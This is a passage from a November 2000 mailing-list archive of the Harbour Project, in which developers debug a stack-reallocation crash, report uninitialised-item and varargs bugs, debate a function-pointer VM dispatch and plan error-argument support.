resolved either with the use of hb_parc(1) and surely when I redo it 
after realloc (I'm sure it's not necessary as when I was doing a 
strcpy() ).

> How could we check this ?

As only Maurillio can reproduce the problem till now, ...

Err: wait I remember a mail from someone having reproduced it ... 
He could probably help retrying against the last CVS image.

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Sat Nov 11 05:37:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Sat Nov 11 05:37:02 2000
Subject: [Harbour] classes.c
In-Reply-To: <200011111023.LAA10408@pegasus.wanadoo.be>
Message-ID: <000601c04bcb$13b5cde0$0f2aa8c0@fivetechs>

JF,

> As I said to maurillio, I can't reproduce the problem (with Maurillio's 
> program with (now) very small modifications) here even with some 
> hvm constant causing very frequent stack reallocation (20 & 5).

That made me thought that it may be a GC issue...

Though, obviously, there may be a bug anywhere...


Antonio

From jfl@wanadoo.be  Sat Nov 11 09:30:04 2000
From: jfl@wanadoo.be (JF Lefebvre)
Date: Sat Nov 11 09:30:04 2000
Subject: [Harbour] classes.c ... hb_parc()
In-Reply-To: <3A0D2930.38FB40B7@libero.it>
Message-ID: <200011111429.PAA29553@pegasus.wanadoo.be>

To all interested,

I just add a debug function to hvm.c

void hb_stackRealloc( void ) (see at end of this 
mail). It can be called anywhere to force a 
stack realloc (with new pointer) without finally 
changing the Stack size.

Calling it from __clsinstsuper() after 
hb_parc(1) (and stackPush() ) and before using 
cString pointer doesn't create a GPF (as 
expected). So I'm sure the problem is not 
related to a stack realloc.

Is there any interest for anyone I upload the 
new hvm.c (with this function) to the CVS ? 


/* the function ************************ */

void hb_stackRealloc( void )
{
   LONG CurrIndex;   /* index of current top 
item */
   LONG TopIndex;    /* index of the topmost 
possible item */
   LONG BaseIndex;   /* index of stack base */
   PHB_ITEM pStack;

   HB_TRACE(HB_TR_DEBUG, ("hb_stackRealloc()"));

   CurrIndex = hb_stack.pPos - hb_stack.pItems;
   TopIndex  = hb_stack.wItems - 1;

   BaseIndex = hb_stack.pBase - hb_stack.pItems;

   /* make more headroom: */

   pStack = hb_stack.pItems ;

   /* Force realloc to another memory pos */
   /* I know there is some better way to do so 
but I want to be sure to test hb_realloc */
   while ( pStack == hb_stack.pItems )
    {
     hb_stack.pItems = ( PHB_ITEM ) hb_xrealloc( 
hb_stack.pItems, sizeof( HB_ITEM ) *
                               ( hb_stack.wItems 
+ STACK_EXPANDHB_ITEMS ) );
     hb_stack.wItems += STACK_EXPANDHB_ITEMS;
    }

   /* Now resize to initial size */
     hb_stack.pItems = ( PHB_ITEM ) hb_xrealloc( 
hb_stack.pItems, sizeof( HB_ITEM ) *
                               ( TopIndex + 1 ) 
);

   /* fix invalid pointers: */
   hb_stack.pPos   = hb_stack.pItems + CurrIndex;
   hb_stack.pBase  = hb_stack.pItems + BaseIndex;
   hb_stack.wItems = TopIndex + 1;

}


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Sat Nov 11 19:36:02 2000
From: harbour@lists.harbour-project.org (Bruno Cantero)
Date: Sat Nov 11 19:36:02 2000
Subject: [Harbour] Bugs in hvm.c
Message-ID: <004e01c04c40$3cf6d080$0201a8c0@PentiumIII>

Hi guys,

1.- hb_vmArrayPush(), file hvm.c, line 2489: hb_arrayGet is called with a
'item' not properly cleared:

---------8<---------
HB_ITEM item;

item.type = HB_IT_NIL;                 <= clear item before!
hb_arrayGet( pArray, ulIndex, &item );
---------8<---------

2.- hb_vmDebuggerEndProc(), file hvm.c, line 3136: same error!
---------8<---------
HB_ITEM item;

HB_TRACE(HB_TR_DEBUG, ("hb_vmDebuggerEndProc()"));

item.type = HB_IT_NIL;                 <= clear item before!
hb_itemCopy( &item, &hb_stack.Return ); /* saves the previous returned value
*/
---------8<---------

Free feel to make these changes or ignore this message.

Regards,
Bruno



From harbour@lists.harbour-project.org  Sat Nov 11 19:42:02 2000
From: harbour@lists.harbour-project.org (Bruno Cantero)
Date: Sat Nov 11 19:42:02 2000
Subject: [Harbour] More bugs
Message-ID: <005801c04c41$1774f520$0201a8c0@PentiumIII>

Hi guys,

hb_par*() functions take optional parameters declared as 'int' but these
parameters are retrieved as 'ULONG'. Size of 'int' and 'ULONG' are different
on non 32bit's environments.

------------8<-----------
char * hb_parc( int iParam, ... )
{
...
      else if( HB_IS_ARRAY( pItem ) )
      {
         va_list va;
         ULONG ulArrayIndex;

         va_start( va, iParam );
         ulArrayIndex = ( ULONG ) va_arg( va, int );     <= retrieving as
interger
         va_end( va );
...
------------8<-----------

Free feel to make these changes or ignore this message.

Regards,
Bruno


From harbour@lists.harbour-project.org  Sat Nov 11 19:47:02 2000
From: harbour@lists.harbour-project.org (Bruno Cantero)
Date: Sat Nov 11 19:47:02 2000
Subject: [Harbour] More bugs
References: <005801c04c41$1774f520$0201a8c0@PentiumIII>
Message-ID: <006201c04c41$e0fdf9a0$0201a8c0@PentiumIII>

Hi, guys,

> hb_par*() functions take optional parameters declared as 'int' but these
> parameters are retrieved as 'ULONG'. Size of 'int' and 'ULONG' are
different
> on non 32bit's environments.
>
> ------------8<-----------
> char * hb_parc( int iParam, ... )
> {
> ...
>       else if( HB_IS_ARRAY( pItem ) )
>       {
>          va_list va;
>          ULONG ulArrayIndex;
>
>          va_start( va, iParam );
>          ulArrayIndex = ( ULONG ) va_arg( va, int );     <= retrieving as
> interger
>          va_end( va );
> ...
> ------------8<-----------

hb_stor*() functions have the same bug!




Free feel to make these changes or ignore this message.

 Regards,
Bruno



From harbour@lists.harbour-project.org  Sat Nov 11 20:17:02 2000
From: harbour@lists.harbour-project.org (Bruno Cantero)
Date: Sat Nov 11 20:17:02 2000
Subject: [Harbour] Becoming VM fast!
Message-ID: <008001c04c45$f5889fc0$0201a8c0@PentiumIII>

Hi guys,

becoming virtual machine fast!

hb_vmExecute() is a big switch-case block, you can change all 'cases' with
an indexed array of pointers to functions and make a simple call to these
pointers...

Now:
--------------------8<--------------------
...
   while( pCode[ w ] != HB_P_ENDPROC )
   {
      switch( pCode[ w ] )
      {
         /* Operators ( mathematical / character / misc ) */

         case HB_P_NEGATE:
            hb_vmNegate();
            w++;
            break;

         case HB_P_PLUS:
            hb_vmPlus();
            w++;
            break;
............ (122 PCODES defined in hbpcode.h )..........
--------------------8<--------------------

Proposal:

--------------------8<--------------------
typedef LONG ( * HB_VM_FUNCP )( const BYTE *, PHB_SYMB );

void hb_vmExecute( const BYTE * pCode, PHB_SYMB pSymbols )
{
   LONG w = 0;
   BOOL bCanRecover = FALSE;
   ULONG ulPrivateBase;
   LONG lOffset;
   HB_VM_FUNCP pFunctions[] = { hb_vmAnd,        /* First PCode:  HB_P_AND
*/
                                hb_vmArrayPush,  /* Second PCode:
HB_P_ARRAYPUSH */
                                .......
                                hb_vmOne };      /* Last PCode: HB_P_ONE */
.................
   while( pCode[ w ] != HB_P_ENDPROC )
   {
      if( pCode[ w ] >= HB_P_LAST_PCODE )
         hb_errInternal( HB_EI_VMBADOPCODE, NULL, NULL, NULL );
      else
         w += pFunctions[ pCode[ w ] ]( pCode, pSymbols );
   }
.................
--------------------8<--------------------

This is only a brief sample, but with a few work...

Regards,
Bruno



From ron@profit-master.com  Sat Nov 11 20:23:02 2000
From: ron@profit-master.com (Ron Pinkas)
Date: Sat Nov 11 20:23:02 2000
Subject: [Harbour] Becoming VM fast!
In-Reply-To: <008001c04c45$f5889fc0$0201a8c0@PentiumIII>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEALDHAA.ron@profit-master.com>

Hi Bruno, (nice to see you back)

I already did that once, and had to revert it, because some here explained
that the C compiler already does such optimization, and even faster.

Ron

> Hi guys,
>
> becoming virtual machine fast!
>
> hb_vmExecute() is a big switch-case block, you can change all 'cases' with
> an indexed array of pointers to functions and make a simple call to these
> pointers...


From harbour@lists.harbour-project.org  Sat Nov 11 20:35:03 2000
From: harbour@lists.harbour-project.org (Bruno Cantero)
Date: Sat Nov 11 20:35:03 2000
Subject: [Harbour] __dbApp and __dbCopy
Message-ID: <009701c04c48$7e3da7a0$0201a8c0@PentiumIII>

Hi guys,

__dbApp() and __dbCopy() must call SELF_TRANS or SELF_TRANSREC methods to
copy data from a workarea to another.


Regards,
Bruno


From midnight@the-oasis.net  Sat Nov 11 22:50:04 2000
From: midnight@the-oasis.net (Phil Barnett)
Date: Sat Nov 11 22:50:04 2000
Subject: [Harbour] After the upgrade to Mailman 2.0rc2...
Message-ID: <3A0DCD07.9746.4E40A36@localhost>

We have a small issue that I have taken up with the developers.

Be careful when you reply to a message. The replyto: may be set 
to the writer of the message and not pointed back to the list. If the 
developers don't come up with a fix in the next day or two, I'll put 
back the old one.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Sun Nov 12 01:15:04 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Sun Nov 12 01:15:04 2000
Subject: [Harbour] Bugs in hvm.c
References: <004e01c04c40$3cf6d080$0201a8c0@PentiumIII>
Message-ID: <00ab01c04c70$092ac560$0a0ac8c8@VECWS1>

Hi Bruno,


> item.type = HB_IT_NIL;                 <= clear item before!
> 
> Free feel to make these changes or ignore this message.

Thanks for the fixes.

Whoever makes this change please use hb_itemInit( item ) 
API call, instead of the direct item access.

Victor Szakats



From harbour@lists.harbour-project.org  Sun Nov 12 01:18:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Sun Nov 12 01:18:02 2000
Subject: [Harbour] Becoming VM fast!
References: <008001c04c45$f5889fc0$0201a8c0@PentiumIII>
Message-ID: <00b501c04c70$76bf4ab0$0a0ac8c8@VECWS1>

Bruno,


> becoming virtual machine fast!
> 
> hb_vmExecute() is a big switch-case block, you can change all 'cases' with
> an indexed array of pointers to functions and make a simple call to these
> pointers...

Someone has done this back then and the result was slower than the 
plain switch method, this is because the C compilers internally 
resolve this huge switch statement with the array of pointers method, 
and they to this it very efficiently.

Victor Szakats



From ron@profit-master.com  Sun Nov 12 02:39:02 2000
From: ron@profit-master.com (Ron Pinkas)
Date: Sun Nov 12 02:39:02 2000
Subject: [Harbour] 2000-11-11 23:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <00b501c04c70$76bf4ab0$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIEANDHAA.ron@profit-master.com>

2000-11-11 23:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * contrib/dot/pp.prg
     ! Corrected few pre-processor bugs.

From harbour@lists.harbour-project.org  Sun Nov 12 05:34:01 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Sun Nov 12 05:34:01 2000
Subject: [Harbour] RDD testing with indexes
References: <006d01c04a5c$ff1a3c50$456410ac@jharrier>
Message-ID: <3A0E7320.7C2B0057@imid.med.pl>

> Juan Agustin Barriga wrote:
 
> Until Harbour... I try to run it, and it crashes both with CDX or NTX.
> dbClearInd(), dbSetIndex(), or elsewhere. Does this mean that they are
> not yet fully functional? Whith what can I compare the results of my
> RDD?

  Both NTX and CDX are not functional yet. 
Can you make public this testing code?

Regards, Ryszard

From harbour@lists.harbour-project.org  Sun Nov 12 05:46:00 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Sun Nov 12 05:46:00 2000
Subject: [Harbour] classes.c
References: <200011102205.XAA04612@pegasus.wanadoo.be>
Message-ID: <3A0E75FF.B41B16F@imid.med.pl>

JF Lefebvre wrote:

> Nooooo, !!! It must be valid, as this is not a value from the stack,
> but instead a copy created by hb_parc(1). The problem could only
> arise when using hb_param() wich in fact return one stack item
> pointer (and so if the stack.base moved...).

  Just to clarify. hb_parc() function does not create a copy of a
string. It returns a pointer stored inside an item. However after the
eval stack growth this pointer is still valid. Only locations of items
placed on the eval stack are changing during the eval stack reallocation
- items values don't change.

Regards, Ryszard

From harbour@lists.harbour-project.org  Sun Nov 12 06:04:02 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Sun Nov 12 06:04:02 2000
Subject: [Harbour] classes.c (Ryszard, JF, Maurilio)
References: <000201c04bc4$faf4e300$0f2aa8c0@fivetechs>
Message-ID: <3A0E7A45.6158DB38@imid.med.pl>

Antonio Linares wrote:

> Could it be that a stack reallocation generates
> a garbage collection (cause the memory management) ?
> 
> I guess that 'cString' points to a memory chunck
> controlled by the garbage collection engine.

  The GC doesn't manage string allocations. Only arrays and codeblocks
are tracked. Although it is possible that the string can be deallocated
indirectly during deallocation of some array or a codeblock. However if
there is no call for hb_gcCollect() or hb_gcCollectAll() then such
memory deallocation is not triggered.
  The GC doesn't keep any info about the eval stack. It is used to
allocate memory for item values thqat are not changed during the stack
reallocation then I don't see any connection here at this moment.

Regards, Ryszard

From jfl@wanadoo.be  Sun Nov 12 06:11:02 2000
From: jfl@wanadoo.be (JF Lefebvre)
Date: Sun Nov 12 06:11:02 2000
Subject: [Harbour] classes.c
In-Reply-To: <3A0E75FF.B41B16F@imid.med.pl>
Message-ID: <200011121110.MAA07638@pyxis.wanadoo.be>

rglab,

> > Nooooo, !!! It must be valid, as this is not a value from the stack, but
> > instead a copy created by hb_parc(1). The problem could only arise when
> > using hb_param() wich in fact return one stack item pointer (and so if
> > the stack.base moved...).
> 
>   Just to clarify. hb_parc() function does not create a copy of a
> string.

Yes, you are rigth, ...

> It returns a pointer stored inside an item. However after the eval
> stack growth this pointer is still valid. Only locations of items placed
> on the eval stack are changing during the eval stack reallocation - items
> values don't change.

Absolutely confirmed by my last test where I created a debug 
function forcing a stack pointer move.



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Sun Nov 12 08:26:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Sun Nov 12 08:26:02 2000
Subject: [Harbour] classes.c (Ryszard, JF, Maurilio)
In-Reply-To: <3A0E7A45.6158DB38@imid.med.pl>
Message-ID: <000601c04cab$cdbce080$0f2aa8c0@fivetechs>

Ryszard,

Thanks so much for your explanation,

regards,

Antonio

> -----Mensaje original-----
> De: harbour-admin@lists.harbour-project.org
> [mailto:harbour-admin@lists.harbour-project.org]En nombre de rglab
> Enviado el: domingo, 12 de noviembre de 2000 12:09
> Para: harbour@lists.harbour-project.org
> Asunto: Re: [Harbour] classes.c (Ryszard, JF, Maurilio)
> 
> 
> Antonio Linares wrote:
> 
> > Could it be that a stack reallocation generates
> > a garbage collection (cause the memory management) ?
> > 
> > I guess that 'cString' points to a memory chunck
> > controlled by the garbage collection engine.
> 
>   The GC doesn't manage string allocations. Only arrays and codeblocks
> are tracked. Although it is possible that the string can be deallocated
> indirectly during deallocation of some array or a codeblock. However if
> there is no call for hb_gcCollect() or hb_gcCollectAll() then such
> memory deallocation is not triggered.
>   The GC doesn't keep any info about the eval stack. It is used to
> allocate memory for item values thqat are not changed during the stack
> reallocation then I don't see any connection here at this moment.
> 
> Regards, Ryszard
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 

From harbour@lists.harbour-project.org  Sun Nov 12 08:31:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Sun Nov 12 08:31:02 2000
Subject: [Harbour] ChangeLog 2000-11-12 15:20 UTC+0100
Message-ID: <3A0EC823.85718FD4@imid.med.pl>

    *include/hbapirdd.h
    *include/hbrddwrk.h
    *source/rdd/dbf1.c
    *source/rdd/dbfcdx/dbfcdx1.c
    *contrib/rdd_ads/ads1.c
        *added typedef for setScope member of virtual table
         typedef USHORT ( * DBENTRYP_VOS  )( AREAP area,
LPDBORDSCOPEINFO param );
        
    *source/rdd/rddcpy.c
        * replaced NULL with 0
        
    *source/vm/asort.c
    *source/vm/classes.c
    *source/vm/hvm.c
    *source/vm/itemapi.c
    *source/vm/memvars.c
        *added initialization of items created on the stack
         (thanks Bruno)

Regards, Ryszard

From harbour@lists.harbour-project.org  Sun Nov 12 09:04:01 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sun Nov 12 09:04:01 2000
Subject: [Harbour] casts needed (?) in rddcpy.c
Message-ID: <200011120903_MC2-BA93-B5A4@compuserve.com>

VC++ reports:
source\rdd\rddcpy.c(149) : error C2446: '=3D' : no conversion from 'void*=
' to 'struct _AREA*'
source\rdd\rddcpy.c(152) : error C2446: '=3D' : no conversion from 'void*=
' to 'struct _AREA*'
source\rdd\rddcpy.c(158) : error C2446: '=3D' : no conversion from 'void*=
' to 'struct _AREA*'
source\rdd\rddcpy.c(161) : error C2446: '=3D' : no conversion from 'void*=
' to 'struct _AREA*'

Casts like this will fix it:
    pAreaTo =3D (AREAP) pAreaRelease->pArea;

Please would someone add them in due course.

John.

From harbour@lists.harbour-project.org  Sun Nov 12 09:05:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Sun Nov 12 09:05:02 2000
Subject: [Harbour] Strange findings
Message-ID: <200011120903_MC2-BA93-B5A6@compuserve.com>

Brian,

"It just makes no sense that an identical routine from a library later in=
 the
link script would be 10 to 15% slower"

If it _is_ alignment, then it does make "sense".  CPUs and their
pre-fetch etc queues and multiple internal parts (aka "units") are
not really intuitive.

E.g. adding _more_ instructions to a loop can sometimes speed it up.

10-15% is nothing: it can be even more!  Don't worry about it.

I first hit this many years ago - IIRC with some of the first 386
chips, was that around 1986?  I was doing some "benchmarking" (*) to
get a feel for how much faster than the previous chips it was, and the
behaviour at the ASM level was initially a surprise.  (BTW, it may
have been years earlier - with the 286 - sorry, it's been too long!)

(*) fairly simplistically, hence the quotes

John.

From harbour@lists.harbour-project.org  Sun Nov 12 11:24:01 2000
From: harbour@lists.harbour-project.org (Jose Lalin)
Date: Sun Nov 12 11:24:01 2000
Subject: [Harbour] HBTest
Message-ID: <3A0EC3EA.62C7E626@corevia.com>

Hello,
anybody knows what happened to hbtest ? The last time I checked (three
months) it reported 98 errors and today it shows 334.

Also, there is a bug in test_end() (hbtest.prg) because it tries to
delete !temp!.dbt which doesn't exist because we are using dbfcdx as
default RDD. It should check for "!temp!." + RddExt()/OrdBagExt().

WM_Regards,
Jose Lalin

From harbour@lists.harbour-project.org  Sun Nov 12 11:25:02 2000
From: harbour@lists.harbour-project.org (Jose Lalin)
Date: Sun Nov 12 11:25:02 2000
Subject: [Harbour] Macro & Binding
Message-ID: <3A0EC43A.760C6DE3@corevia.com>

Hello,
do you get good results with tests/tstblock.prg ? It shows allways
"var3" here.

WM_Regards,
Jose Lalin

From harbour@lists.harbour-project.org  Sun Nov 12 11:45:01 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Sun Nov 12 11:45:01 2000
Subject: [Harbour] HBTest
References: <3A0EC3EA.62C7E626@corevia.com>
Message-ID: <065e01c04cc8$15eba9b0$0a0ac8c8@VECWS1>

Jose,


> Hello,
> anybody knows what happened to hbtest ? The last time I checked (three
> months) it reported 98 errors and today it shows 334.

Because it checks for the oError:args value, but the :arg support 
in the error system is not yet implemented.

> Also, there is a bug in test_end() (hbtest.prg) because it tries to
> delete !temp!.dbt which doesn't exist because we are using dbfcdx as
> default RDD. It should check for "!temp!." + RddExt()/OrdBagExt().

That would be a good fix, but later to be 100% CA-Clipper compatible 
Harbout should default to the DBFNTX RDD.

Victor Szakats



From ron@profit-master.com  Sun Nov 12 11:53:01 2000
From: ron@profit-master.com (Ron Pinkas)
Date: Sun Nov 12 11:53:01 2000
Subject: [Harbour] Macro & Binding
In-Reply-To: <3A0EC43A.760C6DE3@corevia.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEBADHAA.ron@profit-master.com>

Jose,

Early/Late Macro support is currently only available with SimpLex version.
These are the results you'll get:

Early:
Var1
Var2
Var3
Late:
Var3
Var3
Var3

Ron

> Hello,
> do you get good results with tests/tstblock.prg ? It shows allways
> "var3" here.
>
> WM_Regards,
> Jose Lalin


From harbour@lists.harbour-project.org  Sun Nov 12 11:55:03 2000
From: harbour@lists.harbour-project.org (Jose Lalin)
Date: Sun Nov 12 11:55:03 2000
Subject: [Harbour] HBTest
References: <3A0EC3EA.62C7E626@corevia.com> <065e01c04cc8$15eba9b0$0a0ac8c8@VECWS1>
Message-ID: <3A0ECB27.96AFAA4F@corevia.com>

Hi Victor,
> Because it checks for the oError:args value, but the :arg support
> in the error system is not yet implemented.
but then we could disable this feature to see only "real" errors in
hbtest ?

WM_Regards,
Jose Lalin

From harbour@lists.harbour-project.org  Sun Nov 12 12:01:10 2000
From: harbour@lists.harbour-project.org (Jose Lalin)
Date: Sun Nov 12 12:01:10 2000
Subject: [Harbour] Macro & Binding
References: <3A0EC43A.760C6DE3@corevia.com>
Message-ID: <3A0ECC9A.7D996BE3@corevia.com>

Hello,
is there any bug in the new version of MailMan ? I just replied the last
message and it gone to Ron instead of the list.

-----------
Hello,
> Early/Late Macro support is currently only available with SimpLex
version.
I forgot to say that this happened with Flex version.

> These are the results you'll get:
Thanks. That's what I expected running the tests.
----------

WM_Regards,
Jose Lalin

From harbour@lists.harbour-project.org  Sun Nov 12 12:29:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Sun Nov 12 12:29:02 2000
Subject: [Harbour] HBTest
References: <3A0EC3EA.62C7E626@corevia.com> <065e01c04cc8$15eba9b0$0a0ac8c8@VECWS1> <3A0ECB27.96AFAA4F@corevia.com>
Message-ID: <000b01c04cce$42a38300$0a0ac8c8@VECWS1>

Jose,

> Hi Victor,
> > Because it checks for the oError:args value, but the :arg support
> > in the error system is not yet implemented.
> but then we could disable this feature to see only "real" errors in
> hbtest ?

There's no easy way, as it would either mean changing >300 
result strings, or adding the missing feature. The easiest is to 
filter out every ling from the result string which contains "A:" (IIRC).

Victor Szakats



From ron@profit-master.com  Sun Nov 12 15:36:02 2000
From: ron@profit-master.com (Ron Pinkas)
Date: Sun Nov 12 15:36:02 2000
Subject: [Harbour] HBTest
In-Reply-To: <000b01c04cce$42a38300$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEBCDHAA.ron@profit-master.com>

We already have hb_errPutArgs(...). It seems very strait forward, to change
hb_errRT_BASE_Subst(...) etc., to receive additional ... arguments and in
turn call hb_errPutArgs(...). Finally it is fairly simple, though time
consuming, to change all hb_err*() calls to include the operands arguments.

I would suggest that hb_errPutArgs() is changed to accept an ARRAY of ITEMs
rather than variable number ITEM parameters. Similarly adding ARRAY of ITEMs
parameter to hb_err*() will make the subsequent call to hb_errPutArgs(...)
much simpler. Generating the ARRAY of operands before calling hb_err*(...)
and passing it to hb_err*() seems quiet simple.

Any comments?

Ron

> Jose,
>
> > Hi Victor,
> > > Because it checks for the oError:args value, but the :arg support
> > > in the error system is not yet implemented.
> > but then we could disable this feature to see only "real" errors in
> > hbtest ?
>
> There's no easy way, as it would either mean changing >300
> result strings, or adding the missing feature. The easiest is to
> filter out every ling from the result string which contains "A:" (IIRC).
>
> Victor Szakats


From harbour@lists.harbour-project.org  Sun Nov 12 16:04:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Sun Nov 12 16:04:02 2000
Subject: [Harbour] HBTest
References: <LOBBKAFMMFGJIKLMEPAKEEBCDHAA.ron@profit-master.com>
Message-ID: <002c01c04cec$52189730$0a0ac8c8@VECWS1>

Ron,


> I would suggest that hb_errPutArgs() is changed to accept an ARRAY of ITEMs
> rather than variable number ITEM parameters. Similarly adding ARRAY of ITEMs
> parameter to hb_err*() will make the subsequent call to hb_errPutArgs(...)
> much simpler. Generating the ARRAY of operands before calling hb_err*(...)
> and passing it to hb_err*() seems quiet simple.
> 
> Any comments?

I think that passing an array of items needs a relatively complex preparation, 
and cosidering the large number of hb_err() calls, the fact that this call is 
not part of the actual functionality of the caller, and that my main goal till 
now was to make the error launching call a one-liner, which is as simple 
as possible and which doesn't require any stack space from the caller side. 
Because of these I think that the array approach doesn't fit here.

My implementation would include a hb_err() functionl which would 
accept two arguments (which is one of the most common), one which 
would accept one (which is the other most common), perhaps one 
which would accept three (should check if it's worth), and finally one 
with a variable number of parameters, for the rest of the cases.

As a small statistic here are the current hb_err() calls with :arg:
1 parameter: 83
2 parameter: 154
3 parameter: 16
4 parameter: 2
Total of: 255 (83+154+16+2)

Two more notes:
1) Only BASE error types need the :arg feature currently.
2) For easy calling, the caller should pass the original ITEM pointer 
to the hb_err() function (not a copy of the ITEM)

Victor Szakats



From harbour@lists.harbour-project.org  Sun Nov 12 16:50:04 2000
From: harbour@lists.harbour-project.org (Jose Lalin)
Date: Sun Nov 12 16:50:04 2000
Subject: [Harbour] Macro & Binding
References: <3A0EC43A.760C6DE3@corevia.com> <3A0ECC9A.7D996BE3@corevia.com>
Message-ID: <3A0F105D.B4853F72@corevia.com>

Hi again,
I see it now. Ron's message doesn't have "Reply to" field.

JL

From ron@profit-master.com  Sun Nov 12 21:11:01 2000
From: ron@profit-master.com (Ron Pinkas)
Date: Sun Nov 12 21:11:01 2000
Subject: [Harbour] HBTest
In-Reply-To: <002c01c04cec$52189730$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEBDDHAA.ron@profit-master.com>

Victor,

Makes perfect sense. Can you go for it?

Ron

> Ron,
> 
> 
> > I would suggest that hb_errPutArgs() is changed to accept an 
> ARRAY of ITEMs
> > rather than variable number ITEM parameters. Similarly adding 
> ARRAY of ITEMs
> > parameter to hb_err*() will make the subsequent call to 
> hb_errPutArgs(...)
> > much simpler. Generating the ARRAY of operands before calling 
> hb_err*(...)
> > and passing it to hb_err*() seems quiet simple.
> > 
> > Any comments?
> 
> I think that passing an array of items needs a relatively complex 
> preparation, 
> and cosidering the large number of hb_err() calls, the fact that 
> this call is 
> not part of the actual functionality of the caller, and that my 
> main goal till 
> now was to make the error launching call a one-liner, which is as simple 
> as possible and which doesn't require any stack space from the 
> caller side. 
> Because of these I think that the array approach doesn't fit here.
> 
> My implementation would include a hb_err() functionl which would 
> accept two arguments (which is one of the most common), one which 
> would accept one (which is the other most common), perhaps one 
> which would accept three (should check if it's worth), and finally one 
> with a variable number of parameters, for the rest of the cases.
> 
> As a small statistic here are the current hb_err() calls with :arg:
> 1 parameter: 83
> 2 parameter: 154
> 3 parameter: 16
> 4 parameter: 2
> Total of: 255 (83+154+16+2)
> 
> Two more notes:
> 1) Only BASE error types need the :arg feature currently.
> 2) For easy calling, the caller should pass the original ITEM pointer 
> to the hb_err() function (not a copy of the ITEM)
> 
> Victor Szakats


From Juan Agustin Barriga" <harrier@topconnect.cl  Mon Nov 13 09:10:04 2000
From: Juan Agustin Barriga" <harrier@topconnect.cl (Juan Agustin Barriga)
Date: Mon Nov 13 09:10:04 2000
Subject: [Harbour] __dbApp and __dbCopy
References: <009701c04c48$7e3da7a0$0201a8c0@PentiumIII>
Message-ID: <007e01c04d83$709f0c60$456410ac@jharrier>

Trans or TransRec are non mandatory (or so I think) RDD methods. TOPConnect
doesn't implement it. hb_waTrans & hb_waTrans are TODO methods in Harbour.
Using GET/PUTVALUE is quite direct, allows Field filtering AND are mandatory
RDD methods.

Regards
Harrier

----- Original Message -----
From: "Bruno Cantero" <bruno@issnet.net>
To: "Harbour" <harbour@lists.harbour-project.org>
Sent: Saturday, November 11, 2000 9:33 PM
Subject: [Harbour] __dbApp and __dbCopy


> Hi guys,
>
> __dbApp() and __dbCopy() must call SELF_TRANS or SELF_TRANSREC methods to
> copy data from a workarea to another.
>
>
> Regards,
> Bruno
>
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Mon Nov 13 10:37:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Mon Nov 13 10:37:02 2000
Subject: [Harbour] for ... next (Ryszard, Ron)
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKGEBDDHAA.ron@profit-master.com>
Message-ID: <001901c04d87$52a8ece0$0f2aa8c0@fivetechs>

It seems Clipper accepts 

   for x := 1 to n STEP( y )

but Harbour only:

   for x := 1 to n STEP y


Could Harbour accept it too ?


Antonio


From harbour@lists.harbour-project.org  Mon Nov 13 14:20:04 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Mon Nov 13 14:20:04 2000
Subject: [Harbour] ChangeLog 2000-11-13 20:25 UTC+0100
Message-ID: <3A103FF3.6309896E@imid.med.pl>

    *include/hbexpra.c
    *source/compiler/expropta.c
    *source/compiler/harbour.y
    *source/compiler/harbour.sly
        *fixed bug when FOR/TO/STEP (expr) is used

Regards, Ryszard

From harbour@lists.harbour-project.org  Mon Nov 13 14:45:03 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Mon Nov 13 14:45:03 2000
Subject: [Harbour] HBTest
References: <LOBBKAFMMFGJIKLMEPAKGEBDDHAA.ron@profit-master.com>
Message-ID: <002b01c04daa$63df94f0$0a0ac8c8@VECWS1>

Ron,


> Makes perfect sense. Can you go for it?

I've a lot of other work to do, so the only thing I can 
promise is to review/comment the changes if someone 
is kind to implement it.

Victor Szakats



From harbour@lists.harbour-project.org  Mon Nov 13 15:35:07 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Mon Nov 13 15:35:07 2000
Subject: [Harbour] Simplex and FWH
In-Reply-To: <001901c04d87$52a8ece0$0f2aa8c0@fivetechs>
Message-ID: <000001c04db0$f16cdc00$0f2aa8c0@fivetechs>

We have been testing Ron's Simplex with FWH
and we must say it works really ok with it.

Excellent job, Ron! :-)


Antonio


From harbour@lists.harbour-project.org  Mon Nov 13 15:39:02 2000
